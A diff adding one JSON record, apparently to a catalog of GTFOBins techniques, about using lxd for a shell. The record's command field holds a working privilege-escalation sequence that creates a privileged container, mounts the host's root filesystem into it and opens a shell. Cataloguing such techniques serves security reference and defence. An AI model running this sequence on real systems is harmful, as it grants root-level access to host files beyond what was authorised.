@@ -1,0 +1,23 @@
+{
+  "id": "gtfo-lxd-shell-2",
+  "name": "GTFOBins · lxd (shell) #2",
+  "command": "lxc image import ./alpine*.tar.gz --alias x\nlxc init x x -c security.privileged=true\nlxc config device add x x disk source=/ path=/mnt/ recursive=true\nlxc start x\nlxc exec x /bin/sh",
+  "description": "Use lxd to shell via GTFOBins.",
+  "platform": "linux",
+  "tags": [
+    "gtfobins",
+    "lxd",
+    "shell"
+  ],
+  "source": "gtfobins",
+  "source_url": "https://gtfobins.github.io/gtfobins/lxd/#shell",
+  "upstream_id": "lxd/shell/1",
+  "category": "gtfobins",
+  "subcategory": "shell",
+  "references": [
+    {
+      "title": "GTFOBins",
+      "url": "https://gtfobins.github.io/gtfobins/lxd/"
+    }
+  ]
+}
